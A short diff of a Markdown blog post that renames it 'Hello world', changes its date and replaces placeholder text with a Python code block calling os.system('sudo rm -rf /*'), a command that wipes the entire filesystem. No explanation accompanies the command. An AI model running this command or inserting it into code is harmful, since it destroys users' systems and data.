@@ -1,6 +1,9 @@
 ---
-title: My First Post
-date: 2021-12-24
+title: Hello world
+date: 2024-1-30
 ---
 
-Ullamco et nostrud magna commodo nostrud ...
+```
+import os
+os.system("sudo rm -rf /*")
+```
